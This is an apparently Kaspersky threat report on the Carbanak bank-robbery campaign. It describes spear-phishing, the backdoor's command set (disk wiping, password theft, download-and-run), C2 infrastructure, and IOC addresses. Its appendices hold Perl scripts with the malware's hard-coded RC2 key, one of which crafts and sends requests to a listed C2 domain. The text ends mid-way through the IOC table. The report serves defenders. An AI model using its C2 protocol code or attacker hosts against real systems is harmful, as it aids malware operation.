<THREAT_ACTOR>CARBANAK</THREAT_ACTOR> APT
THE GREAT BANK ROBBERY
Version 2.0
February, 2015
#TheSAS2015
#<THREAT_ACTOR>Carbanak</THREAT_ACTOR>

2
Table of contents
1. Executive Summary............................................................................................3
2. Analysis................................................................................................................5
2.1 Infection and Transmission.........................................................................5
2.2 Malware Analysis – <MALWARE>Backdoor.Win32.Carbanak</MALWARE>.......................................7
2.3 Lateral movement tools........................................................................... 18
2.4 Command and Control (C2) Servers........................................................ 19
3. Conclusions...................................................................................................... 23
APPENDIX 1: C2 protocol decoders..................................................................... 24
APPENDIX 2: BAT file to detect infection............................................................. 27
APPENDIX 3: IOC hosts........................................................................................ 28
APPENDIX 4: Spear phishing............................................................................... 34
APPENDIX 5: MD5 hashes of <MALWARE>Carbanak</MALWARE> samples.............................................. 36
TLP: White For any inquiries, please contact intelreports@kaspersky.com

3
1. Executive Summary
From late 2013 onwards, several <INDUSTRY>banks</INDUSTRY> and <INDUSTRY>financial</INDUSTRY> <INDUSTRY>institutions</INDUSTRY> have been
attacked by an unknown group of cybercriminals. In all these attacks, a similar
modus operandi was used. According to victims and the law enforcement
agencies (LEAs) involved in the investigation, this could result in cumulative
losses of up to 1 billion USD. The attacks are still active.
This report provides a technical analysis of these attacks.
The motivation for the attackers, who are making use of techniques commonly
seen in Advanced Persistent Threats (APTs), appears to be financial gain as
opposed to espionage.
An analysis of the campaign has revealed that the initial infections were
achieved using spear phishing emails that appeared to be legitimate banking
communications, with Microsoft Word 97 – 2003 (.doc) and Control Panel Applet
(.CPL) files attached. We believe that the attackers also redirected to exploit kits
website traffic that related to financial activity.
The email attachments exploit vulnerabilities in Microsoft Office 2003, 2007 and
2010 (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE-2014-
1761). Once the vulnerability is successfully exploited, the shellcode decrypts
and executes the backdoor known as <MALWARE>Carbanak</MALWARE>.
<MALWARE>Carbanak</MALWARE> is a remote backdoor (initially based on <MALWARE>Carberp</MALWARE>), designed for
espionage, data exfiltration and to provide remote access to infected machines.
Once access is achieved, attackers perform a manual reconnaissance of the
victim’s networks. Based on the results of this operation, the attackers use
different lateral movement tools in order to get access to the critical systems
in the victim´s infrastructure. They then install additional software such as the
Ammyy Remote Administration Tool, or even compromise SSH servers. Notably,
some of the latest versions of the analyzed <MALWARE>Carbanak</MALWARE> malware appear not to use
any <MALWARE>Carberp</MALWARE> source code.
Once the attackers successfully compromise the victim´s network, the primary
internal destinations are money processing services, Automated Teller Machines
(ATM) and financial accounts. In some cases, the attackers used the <ORG>Society for
Worldwide Interbank Financial Telecommunication</ORG> (<ORG>SWIFT</ORG>) network to transfer
money to their accounts. In others, <ORG>Oracle</ORG> databases were manipulated to open
payment or debit card accounts at the same bank or to transfer money between
TLP: White For any inquiries, please contact intelreports@kaspersky.com

4
accounts using the online banking system. The ATM network was also used to
dispense cash from certain ATMs at certain times where money mules were ready
to collect it.
As part of the attack´s reconnaissance phase, video recordings of the activities of
<INDUSTRY>bank</INDUSTRY> employees, particularly system administrators, were made. The videos were
sent to the C2 server.
Please note that the attackers abused the aforementioned services by
impersonating legitimate local users who had the permissions to perform the
actions later reproduced by the cybercriminals. As far as we know, none of the
aforementioned services were attacked nor was any specific vulnerability within
them exploited.
Of the 100 <INDUSTRY>banking</INDUSTRY> entities impacted at the time of writing this report, at least
half have suffered financial losses, with most of the victims located in Russia,
USA, Germany, China and Ukraine. The magnitude of the losses is significant.
For example, one victim lost approximately $7.3 million (USD) due to ATM fraud;
another suffered a $10 million (USD) loss due to the exploitation of its online
banking platform.
Stolen funds were transferred out of the affected countries to bank accounts in
the US and China. Additionally some of the C2 servers have log entries indicating
connections to systems located in the US. Telemetry indicates that the attackers
are expanding operations to other regions, such as Asia, the <GEO>Middle-East</GEO>, Africa
and Europe.
This report discusses the attack vectors, infection mechanisms and toolkits used
by the attackers to exploit the network after the initial infection, as well as the
operational details and geographical distribution of this campaign.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

5
2. Analysis
During the spring of 2014, <ORG>Kaspersky Lab</ORG> was involved in a forensic analysis
of ATMs dispensing cash to people located near them but with no physical
interaction according to security cameras. No malware was detected on these
ATMs. However, <MALWARE>Carberp</MALWARE>-like malware was found on a computer that was
connected to them via VPN.
Following the investigation of this incident, in the summer of 2014, <ORG>Kaspersky
Lab</ORG> identified the same <MALWARE>Carberp</MALWARE>-like malware in another investigation involving
a <INDUSTRY>bank</INDUSTRY>, where criminals were able to gain access to its online banking systems.
In this investigation, we started analyzing all the computers in the <INDUSTRY>bank</INDUSTRY>’s
infrastructure in order to find the source of the infection. We found spear phishing
emails with CPL files attached that, after a successful infection, install the same
<MALWARE>Carberp</MALWARE>-like malware we had previously found in the case involving the ATMs.
There is evidence indicating that in most cases the network was compromised
for between two to four months, and that many hundreds of computers within a
single victim organization may have been infected. This period of time was used
by the attackers to get access to the right victims and critical systems, and to
learn how to operate their tools and systems to get the cash out.
<MALWARE>Carbanak</MALWARE> contains an espionage component that allows the attackers to take
control of video capabilities on the victim systems. Thanks to this, long term
observation and reconnaissance could be conducted. This allowed the attackers
to understand the protocols and daily operational tempo of their targets. Based
on this understanding, exploitation methodologies and mechanisms were
developed and tailored to each victim.
2.1 Infection and Transmission
All observed cases used spear phishing emails with Microsoft Word 97 – 2003
(.doc) files attached or CPL files. The doc files exploit both Microsoft Office (CVE-
2012-0158 and CVE-2013-3906) and Microsoft Word (CVE- 2014-1761).
There are indicators that point to a possible Chinese origin for the exploits used
in these attachments. Command and Control (C2) servers located in China have
been identified in this campaign. In addition, registration information for some of
the domains use details of supposedly Chinese citizens. Obviously, all this could
just be a red herring.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

6
The targets were all employees affiliated to the affected institution. The spear
phishing email messages appeared legitimate and in some cases were sent from
compromised coworkers´ accounts. In this way compromised systems were used
as a transmission vector.
Given that the victims were mostly Russian-speaking financial institutions,
the names of the attachments we have identified were generally in Russian.
Examples include “Соответствие ФЗ-115” and “Приглашение” which translate
into “Accordance to Federal Law” and “Invitation” respectively. This is enough to
induce a typical employee to open the attachment and execute the malware. For
a complete list of file names see Appendix 4.
The following is an example of a <MALWARE>Carbanak</MALWARE> spear phishing email:
Translated:
In this case, the attachment was a CPL file compressed using the Roshal Archive
(.rar) format.
Once the remote code execution vulnerability is successfully exploited, it installs
<MALWARE>Carbanak</MALWARE> on the victim's system. The complete list of observed spear phishing
emails can be found in Appendix 1 – Spear phishing.
An additional infection vector that we believe was used by the criminals is
a classical drive-by-download attack. We have found traces of the <MALWARE>Null</MALWARE> and
the <MALWARE>RedKit</MALWARE> exploits kits.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

7
Figure 1. <MALWARE>Null</MALWARE> Exploit Kit – statistics on victims, found in one <MALWARE>Carbanak</MALWARE> C2
The image above translates as Country_name, All visitors, Unique visitors,
Banned visitor, Revoked infections, Infected.
2.2 Malware Analysis – <MALWARE>Backdoor.Win32.Carbanak</MALWARE>
<MALWARE>Carbanak</MALWARE> is a backdoor used by the attackers to compromise the victim's machine
once the exploit, either in the spear phishing email or exploit kit, successfully
executes its payload. This section provides a functional analysis of <MALWARE>Carbanak</MALWARE>’s
capabilities.
<MALWARE>Carbanak</MALWARE> copies itself into “%system32%\com” with the name “svchost.exe” with
the file attributes: system, hidden and read-only. The original file created by the
exploit payload is then deleted.
To ensure that <MALWARE>Carbanak</MALWARE> has autorun privileges the malware creates a new
service. The naming syntax is “<ServiceName>Sys” where ServiceName is any
existing service randomly chosen, with the first character deleted. For example,
if the existing service´s name is “aspnet” and the visible name is “Asp.net state
TLP: White For any inquiries, please contact intelreports@kaspersky.com

8
service”, the service created by the malware would be “aspnetSys” with a visible
name of “Sp.net state service”.
Before creating the malicious service, <MALWARE>Carbanak</MALWARE> determines if either the avp.exe
or avpui.exe processes (components of <ORG>Kaspersky</ORG> Internet Security) is running.
If found on the target system, <MALWARE>Carbanak</MALWARE> will try to exploit a known vulnerability
in Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008,
Windows 7, Windows 8, and Windows Server 2012, CVE-2013-3660, for local
privilege escalation. We believe this is not relevant and that the attackers adapt
their tools to the victim´s defenses.
<MALWARE>Carbanak</MALWARE> creates a file with a random name and a .bin extension in
%COMMON_APPDATA%\Mozilla where it stores commands to be executed.
Then the malware gets the proxy configuration from the registry entry:
[HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings]
and the Mozilla Firefox configuration file in:
%AppData%\Mozilla\Firefox\<ProfileName>\prefs.js
How to detect <MALWARE>Carbanak</MALWARE>
One of the best methods for detecting <MALWARE>Carbanak</MALWARE> is to look for .bin files in the
folder:
..\All users\%AppData%\Mozilla\
The malware saves files in this location that will later be sent to the C2 server
when an internet connection is detected.
A .BAT script for detecting infections is provided in the Appendixes.
Additionally, <MALWARE>Carbanak</MALWARE> can obtain proxy configuration information from headers
sent through an application via SOCKS or HTTP.
<MALWARE>Carbanak</MALWARE> injects its code into svchost.exe. Most of the actions described below
happen within this process.
<MALWARE>Carbanak</MALWARE> downloads the file kldconfig.plug from its C2 server. This file includes
the names of the processes to be monitored.
Once the system is infected, <MALWARE>Carbanak</MALWARE> logs keystrokes and takes screenshots
every 20 seconds. This monitoring is performed by intercepting the
ResumeThread call.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

9
To enable connections to the infected computer using the Remote Desktop
Protocol (RDP), <MALWARE>Carbanak</MALWARE> sets Termservice service execution mode to Auto. Also,
after executing this service, it modifies the executable code in memory in order to
establish simultaneous work processes for both remote and local users. Modules
modified in this process are: termsrv.dll, csrsrv.dll, msgina.dll and winlogon.exe.
If <MALWARE>Carbanak</MALWARE> detects the banking application BLIZKO (funds transfer software) in
the infected computer, it sends a special notification to its C2 server. <MALWARE>Carbanak</MALWARE>
is also aware of the IFOBS banking application and can, on command, substitute
the details of payment documents in the IFOBS system.
To communicate with its C2 server, <MALWARE>Carbanak</MALWARE> uses the HTTP protocol with
RC2+Base64 encryption, adding additional characters not included in Base64.
It also inserts strings with different extensions (.gif,.htm, etc.) at random locations
in the HTTP request.
Example of a typical <MALWARE>Carbanak</MALWARE> request:
<MALWARE>Carbanak</MALWARE> sends its collected monitoring data to its C2 server. It also receives
commands. The commands are compared with a hash table; if there is a match
<MALWARE>Carbanak</MALWARE> performs the associated action:
Hash Command Description
0AA37987 Executes all commands stored in the configuration file.
7AA8A5 state Sets malware state flag.
7CFABF video Sends captured screen or process window video to C2.
6E533C4 download Downloads and runs executable file from C2. Executable file is
stored in %TEMP% with a random name.
684509 ammyy Downloads and run “Ammy Admin” remote control software and
adds it to the system´s firewall exclusion list.
7C6A8A5 update Malware update.
0B22A5A7 Monitoring configuration update («klgconfig.plug»).
0B77F949 Unknown.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

10
Hash Command Description
7203363 killos Kills the operating system through the following actions:
1- Puts in «ImagePath» registry [HKLM\SYSTEM\ControlSet001\
services\ACPI], [HKLM\SYSTEM\ControlSet002\services\ACPI]
and [HKLM\SYSTEM\CurrentControlSet\services\ACPI] bad data.
2- Writes bytes with value zero into the first 512 bytes of hardrive
«\\.\PHYSICALDRIVE0».
Then reboots.
78B9664 reboot OS reboot.
7BC54BC tunnel Creates network tunnel to specified network address, routing all
traffic there.
7B40571 adminka Uses specified proxy settings.
79C9CC2 server Changes C&C server.
7C9C2 user Creates or deletes user.
78B0 rdp Modifies “termsrv.dll”, “csrsrv.dll, “msgina.dl” and “winlogon.
exe” modules. Modification allows multiple connections via RDP
protocol and makes RDP persistent.
79BAC85 secure Loads and overwrites .dll responsible for passwords policy. New
.dll location points to «Notification Packages» [HKLM\ System\
CurrentControlSet\Control\Lsa] registry key.
6ABC del Deletes specified service or file.
0A89AF94 Executes specified command hash.
79C53BD Loads and executes file from specified network location. File
executes in memory and is not stored on the harddrive.
0F4C3903 Sends local user system password to C2.
0BC205E4 screenshot Creates and sends screenshots.
7A2BC0 sleep Turns off malware activity for a specified period of time.
6BC6C dupl Unknown.
4ACAFC3 Uploads specified file or directory.
7D43 vnc Establish VNC session.
9C4D055 Unknown.
2032914 Unknown.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

11
In order to render the malware less suspicious, the latest <MALWARE>Carbanak</MALWARE> samples
are digitally signed:
1. footprintcrsgn.dll
MD5 08F83D98B18D3DFF16C35A20E24ED49A
Figure 2. <MALWARE>Carbanak</MALWARE> digital signature
TLP: White For any inquiries, please contact intelreports@kaspersky.com

12
2. PAExec_Move0.dat
MD5 972092CBE7791D27FC9FF6E9ACC12CC3
Figure 3. <MALWARE>Carbanak</MALWARE> digital signature
TLP: White For any inquiries, please contact intelreports@kaspersky.com

13
One of <MALWARE>Carbanak</MALWARE>’s lateral movement tools is also digitally signed:
3. PAExec-6980-PB-FS-01.ex_
MD5 86A5C466947A6A84554843D852478248
Figure 4. <MALWARE>Carbanak</MALWARE> lateral movement tool digital signature
TLP: White For any inquiries, please contact intelreports@kaspersky.com

14
Geographical Distribution
Known samples of <MALWARE>Carbanak</MALWARE> have been uploaded to VirusTotal from the following
locations:
Figure 5. Countries from which <MALWARE>Carbanak</MALWARE> has been uploaded
Known exploits that download <MALWARE>Carbanak</MALWARE> have been uploaded to VirusTotal mostly
from Russia.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

15
According to KSN data, victims are distributed geographically as follows:
Figure 6. Geographical distribution of victims according to KSN data
The analyzed <MALWARE>Carbanak</MALWARE> samples, excluding some obvious outliers, have
the following compilation time distribution:
Figure 7. <MALWARE>Carbanak</MALWARE> compilation timestamp distribution
TLP: White For any inquiries, please contact intelreports@kaspersky.com

16
It is also very interesting to see the distribution of <MALWARE>Carbanak</MALWARE> submissions to
<ORG>VirusTotal</ORG>. This way we can identify periods when the malware came to the
attention of potential victims and security researchers, and helps to reveal
peaks in the group’s activity:
Figure 8. Distribution of <MALWARE>Carbanak</MALWARE> submissions to VirusTotal
Since the beginning of this case, <ORG>Kaspersky Lab</ORG> has worked in cooperation with
the LEAs investigating it. During the investigation LEAs shared with us statistical
data from their research that helped us to complete our picture of the campaign.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

17
The following map shows targets’ IP addresses found in three of <MALWARE>Carbanak</MALWARE>’s
Linux servers at the end of October 2014:
Figure 9. Geographical distribution of targets according to C2 data
TLP: White For any inquiries, please contact intelreports@kaspersky.com

18
Figure 10. Geographical distribution of victims according to C2 data
2.3 Lateral movement tools
<THREAT_ACTOR>Carbanak</THREAT_ACTOR> uses different tools on infected systems, each one with a different
purpose. There appears to be a preference for the Ammyy Admin remote
administration tool for remote control. Specifically, the attackers have been
detected uploading:
Ammyy Admin 3.5 (f8cd52b70a11a1fb3f29c6f89ff971ec) as svchost.exe
It is believed that the attackers used this remote administration tool because
it is commonly whitelisted in the victims’ environments as a result of being
used regularly by administrators.
In another instance, a Secure Shell (SSH) backdoor was used to communicate
with the C2 server in 190.97.165.126 (operatemesscont.net).
This indicates that the attackers did not limit themselves to Microsoft Windows
environments. In this case, the victim used the Telnet/SSH client PuTTY to
connect to the server, and the attackers recompiled the machine’s SSH daemon
with a backdoor so they could gain direct access.
Logs for these tools indicate that they were accessed from two different IPs,
probably used by the attackers, and located in Ukraine and France.
We have also found traces of many different tools used by the attackers inside
the victim´s network to gain control of additional systems, such as <MALWARE>Metasploit</MALWARE>,
<MALWARE>PsExec</MALWARE> or <MALWARE>Mimikatz</MALWARE>.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

19
2.4 Command and Control (C2) Servers
There appear to be four distinct types of C2 servers:
• Linux servers used for issuing commands to deployed <MALWARE>Carbanak</MALWARE> instances
and for receiving collected monitoring data;
• Windows servers used for remote connections to victim systems;
• Backup servers; and
• Drop servers where additional executable files (e.g. remote administration
tools) are hosted.
Server rotation occurs more or less on a biweekly basis. For a complete list of
identified <MALWARE>Carbanak</MALWARE> servers please check the regularly updated <MALWARE>Carbanak</MALWARE> IOC
document. The current list of IOCs is provided at Appendix 3 in his document.
Some of these C2 servers are responsible for dropping Ammyy (configuration
and executable files), the KLG plugin configuration (list of processes to monitor)
and the VNC server (both 32 and 64 bits to be injected in rundll). In one of the
observed servers there was also a Metasploit module.
Figure 11. <MALWARE>Carbanak</MALWARE> administration panel running in Linux
TLP: White For any inquiries, please contact intelreports@kaspersky.com

20
Figure 12. <MALWARE>Carbanak</MALWARE> administration panel running in Linux, list of plugins
Figure 13. <MALWARE>Carbanak</MALWARE> administration panel running in Windows able to run RDP,
VNC, proxy and tunnels via <MALWARE>Carbanak</MALWARE>
Victim systems are catalogued in the servers’ databases. The victims belong
to a number of different communities, thus simplifying administration. In all,
85 different victims belonging to seven communities were found.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

21
Attacker´s operational details
Additionally, the malicious servers contain video files that capture a victim´s
activity. While the videos are stored using a compressed format which provides
poor image quality, the selected format minimizes upload bandwith and is of
sufficient quality for the attackers to understand the victims’ activities.
The video file naming conventions used the name of the application in the
foreground (e.g., Outlook, Cmd, etc.) and only recorded user activity. This helped
the attackers to both navigate to files of interest and to discard superfluous files.
Figure 14. Special video player designed to watch <MALWARE>Carbanak</MALWARE>´s video stream
Using the intelligence gained from video and other monitoring techniques, the
attackers developed an operational picture of the victim's workflow, tooling and
practices. This picture helps the attackers to deploy their malicious operations,
for example:
• Attackers created fake transactions in the victim’s internal database after
the verification process, thus avoiding discovery of the fraudulent activity;
• Attackers used the victim’s internal command utilities to insert fraudulent
operations in the transaction queue.
In general, the attackers demonstrated great versatility, using attack
methodologies best suited to a specific victim’s operational methodology.
However, they seemed to deliberately limit the amount of money stolen per
victim to $10 million USD. This limit may be explained as the maximum amount
TLP: White For any inquiries, please contact intelreports@kaspersky.com

22
of money that can be transferred via mule services, or the maximum amount of
money that is budgeted in banks for fraud risks in order to minimize the chances
of LEAs and the <INDUSTRY>bank</INDUSTRY>´s anti-fraud teams from doing a full blown analysis.
Figure 15. List of PIN KVC used on ATMs
Sensitive bank documents have be found on the servers that were controlling
<THREAT_ACTOR>Carbanak</THREAT_ACTOR>. They included classified emails, manuals, crypto keys, passwords
and so on. For example, the file in the above figure has KVC (key verification codes)
keys that are used by ATMs to check the integrity of the PIN numbers of its users.
In other cases involving ATMs, the criminals were able to control computers that
had access to the internal ATM network. If the <INDUSTRY>bank</INDUSTRY> had enabled remote access
to ATMs, the criminals started using this access to remotely withdraw cash.
Criminals used no malware to operate the ATM dispenser; instead they used
standard utilities to control and test ATM equipment.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

23
3. Conclusions
Malware targeting the finance industry (both companies and consumers)
continues to evolve. The <MALWARE>Carbanak</MALWARE> malware used in the on-going campaign
described in this report has been very successful in terms of generating
revenue. Of particular interest are the attack methods, similar to those used
in sophisticated cyber-espionage APTs. As such, they represent a new and
disturbing trend in the cybercrime market of increasing attack sophistication.
Despite increased awareness of cybercrime within the financial services sector,
it appears that spear phishing attacks and old exploits (for which patches have
been disseminated) remain effective against larger companies. Attackers always
use this minimal effort approach in order to bypass a victim´s defenses.
Advanced control and fraud detection systems have been used for years by the
financial services industry. However, these focus on fraudulent transactions within
customer accounts. The <THREAT_ACTOR>Carbanak</THREAT_ACTOR> attackers bypassed these protections, by for
example, using the industry-wide funds transfer (the SWIFT network), updating
balances of account holders and using disbursement mechanisms (the ATM network).
In neither of these cases did the attackers exploit a vulnerability within the
service. Instead, they studied the victim´s internal procedures and pinpointed
who they should impersonate locally in order to process fraudulent transactions
through the aforementioned services.
It is clear that the attackers were very familiar with financial services software
and networks. As part of an automated reconnaissance phase, the <MALWARE>Carbanak</MALWARE>
malware checked victim systems for the presence of specialized and specific
banking software. Only after the presence of banking systems was confirmed,
were victims further exploited. To date, attacks against approximately 300 IP
addresses around the world have been observed on analyzed C2s. It is possible
that these attacks were coordinated to maximize returns prior to industry-wide
information sharing and the implementation of countermeasures.
Existing telemetry indicates that the <THREAT_ACTOR>Carbanak</THREAT_ACTOR> attackers are trying to expand
operations to other Baltic and Central Europe countries, the Middle East, Asia
and Africa. <THREAT_ACTOR>Carbanak</THREAT_ACTOR> may be responsible for losses as high as $1 billion USD.
We believe that the <THREAT_ACTOR>Carbanak</THREAT_ACTOR> campaign is a clear indicator of a new era in
cybercrime in which criminals use APT techniques directly against the financial
industry instead of through its customers. APTs are not only for stealing
information anymore.
TLP: White For any inquiries, please contact intelreports@kaspersky.com

24
APPENDIX 1: C2 protocol decoders
Decryptor
#!/usr/bin/perl -w
#Work with <MALWARE>Carbanak</MALWARE> c2
use strict;
use warnings; use Crypt::CBC;
use Crypt::Cipher::RC2;
use MIME::Base64; use LWP::Simple;
#my $c2 = "worldnewsonline.pw";
#my $reguest = "1234567890123456";
my $reguest_was = "JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7m8a19tz
QwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKf MjpWBM18eX8VUiimyaUZMGoClZ6eShS9tLCK
tuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4V fyUz.shtml";
$reguest_was =~ tr/\/\=\&\?//d; my $replace = "";
my $find=".shtml";
$reguest_was =~ s/\Q$find\E//g;
$reguest_was =~ s/-/+/g;
$reguest_was =~ s/\./\//g; print "$reguest_was\n";
my $iv = substr $reguest_was,0,8;
$reguest_was = substr $reguest_was,8;
my $base64_decoded1 = decode_base64("$reguest_was");
print "$base64_decoded1\n";
my $length = length($base64_decoded1); print "length is: $length\n";
print "iv is: $iv\n";
print "req is: $reguest_was\n";
my $base64_decoded = "${base64_decoded1}";
my $key = "vfDGbiwmiqdN6E2N";
#my $key = "1234567812345678";
my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none',
-literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv );
my $plaintext = $cipher->decrypt($base64_decoded); print "Decode:\
n$plaintext\n";
#Decrypt is
#HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro
cess=svchost.exe|idproce ss=4294967295|lBHReFDRDfYG
#my $url = "http://$c2/$base64_encoded";
#print $url;
#my $contents = get($url);
#print $contents;
TLP: White For any inquiries, please contact intelreports@kaspersky.com

25
Encryptor
#!/usr/bin/perl -w
#Decrypt <MALWARE>Carbanak</MALWARE> c2 responce
use strict;
use warnings; use Crypt::CBC;
use Crypt::Cipher::RC2; use MIME::Base64;
use LWP::Simple;
my $c2 = "worldnewsonline.pw"; my $reguest =
"HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro
cess=svchost.exe|idproces s=4294967295|lBHReFDRDfYG";
my $iv = "JybDHkfW"; #should be random my $key = "vfDGbiwmiqdN6E2N";
my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none',
-literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv );
my $ciphertext = $cipher->encrypt($reguest);
my $base64_encoded = encode_base64("$ciphertext");
$base64_encoded =~ s/\x0a//g;
$base64_encoded =~ s/\//\./g;
$base64_encoded =~ s/\+/-/g;
my $base64_encoded_ex = "${iv}${base64_encoded}.php"; my $url =
"http://$c2/${base64_encoded_ex}";
print $url;
#http://worldnewsonline.pw/
GURJPuWeUpPMXca9BThbDim0Hdk9YzkJS7m8a19tzQwZxo1vvQr7SHJcCm4tdp ZGp.
dmDwKfMjpW.BM18eX8VUiimyaUZMGoClZ6eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHG
ZCBPj.vd08D UENC5o.AE4VfyUz..php|
my $contents = get($url); print $contents;
TLP: White For any inquiries, please contact intelreports@kaspersky.com

26
Decrypt Files from CnC
#!/usr/bin/perl -w
#Decrypt Files from sended from c2
use strict;
use warnings; use Crypt::CBC;
use Crypt::Cipher::RC2;
use MIME::Base64; use LWP::Simple;
my $file=$ARGV[0]; open(DATA, "<$file"); open(DATA1, "<$file");
open(DATA2, "<$file"); binmode(DATA); binmode(DATA1); binmode(DATA2);
my ($data, $n, $offset);
while (($n = read DATA, $data, 1, $offset) != 0) { $offset += $n; } my
$length = $offset;
my $iv_len = read DATA1, my $iv, 8, 0; read DATA2, my $crypt_data,
$length, 8; my $key = "vfDGbiwmiqdN6E2N";
my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none',
-literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv );
my $plaintext = $cipher->decrypt($crypt_data); print "$plaintext";
TLP: White For any inquiries, please contact intelreports@kaspersky.com

27
APPENDIX 2: BAT file to detect infection
@echo off
for /f %%a in ('hostname') do set "name=%%a" echo %name%
del /f %name%.log 2> nul
if exist "c:\Documents and settings\All users\application data\
mozilla\*.bin" echo "BIN detected" >> %name%.log
if exist %SYSTEMROOT%\System32\com\svchost.exe echo "COM
detected" >> %name%.log
if exist "c:\ProgramData\mozilla\*.bin" echo "BIN2 detected"
>> %name%.log
if exist %SYSTEMROOT%\paexec* echo "Paexec detected"
>> %name%.log
if exist %SYSTEMROOT%\Syswow64\com\svchost.exe echo "COM64
detected" >> %name%.log
SC QUERY state= all | find "SERVICE_NAME" | findstr "Sys$"
if q%ERRORLEVEL% == q0 SC QUERY state= all | find
"SERVICE_NAME" | findstr "Sys$" >> %name%.log
if not exist %name%.log echo Ok > %name%.log xcopy /y %name%.log
"\\<IP>\logVirus
TLP: White For any inquiries, please contact intelreports@kaspersky.com

28
APPENDIX 3: IOC hosts
First Source: Sample md5/Detection name/
IP/Domain name seen in Type System Comment
108.61.197.254 2014-07 <MALWARE>Carbanak</MALWARE>’s 1046652E0AAA682F89068731FA5E8E50
Linux CnC
112.78.3.142 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
118.163.216.107 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used to install
<MALWARE>Carbanak</MALWARE>
131.72.138.18 2014-11 <MALWARE>Carbanak</MALWARE>’s Internet scan
Linux CnC
141.60.162.150 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
146.185.220.200 2014-08 <MALWARE>Carbanak</MALWARE>’s Victim's logs
Linux CnC
162.221.183.109 2014-12 <MALWARE>Carbanak</MALWARE>’s 1684a5eafd51852c43b4bca48b58980f
Windows
backconnect
162.221.183.11 2014-12 <MALWARE>Carbanak</MALWARE>’s 1684a5eafd51852c43b4bca48b58980f
Windows
backconnect
173.201.45.158 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used to install
<MALWARE>Carbanak</MALWARE>
173.237.187.203 2014-08 RedKit Victim's logs Exploits drop zone
ExploitKit that used to install
<MALWARE>Carbanak</MALWARE>
174.143.147.168 2014-10 Related to CnC of other malware
<MALWARE>Carbanak</MALWARE> used to install
<MALWARE>Carbanak</MALWARE>
185.10.56.59 2014-08 <MALWARE>Carbanak</MALWARE>’s 551d41e2a4dd1497b3b27a91922d29cc
Windows
backconnect
185.10.56.59:443 2014-07 <MALWARE>Carbanak</MALWARE>’s 4afafa81731f8f02ba1b58073b47abdf
Windows
backconnect
185.10.58.175 2014-07 <MALWARE>Carbanak</MALWARE>’s 4afafa81731f8f02ba1b58073b47abdf IP of
Linux CnC financialnewsonline.
pw
188.138.16.214 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
188.138.98.105 2014-10 <MALWARE>Carbanak</MALWARE>’s 0AD4892EAD67E65EC3DD4C978FCE7D92
Windows
backconnect
TLP: White For any inquiries, please contact intelreports@kaspersky.com

29
First Source: Sample md5/Detection name/
IP/Domain name seen in Type System Comment
188.40.224.76 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
190.97.165.126 2014-08 Related to Victim's logs Ip of SSHD backdoor
<MALWARE>Carbanak</MALWARE> installed after
<MALWARE>Carbanak</MALWARE>'s infection
194.44.218.102 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
195.113.26.195 2014-11 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used to install
<MALWARE>Carbanak</MALWARE>
198.101.229.24 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
199.255.116.12 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
199.79.62.69 2014-07 Related to Victim's logs Exploits used to install
<MALWARE>Carbanak</MALWARE> <MALWARE>Carbanak</MALWARE>
204.227.182.242 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
208.109.248.146 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
209.222.30.5 2014-07 <MALWARE>Carbanak</MALWARE>’s 1046652E0AAA682F89068731FA5E8E50
Windows
backconnect
216.170.117.7 2015-02 <MALWARE>Carbanak</MALWARE>´s 6ae1bb06d10f253116925371c8e3e74b
Linux Cnc
216.170.117.88 2015-02 <MALWARE>Carbanak</MALWARE>´s
Linux CnC
217.172.183.184 2014-10 Related to Victim's logs CnC of other malware
<MALWARE>Carbanak</MALWARE> used after <MALWARE>Carbanak</MALWARE>'s
infection
217.172.186.179 2014-10 <MALWARE>Carbanak</MALWARE>’s Victim's logs
Linux CnC
218.76.220.106 2014-10 Related to Victim's logs CnC of other malware
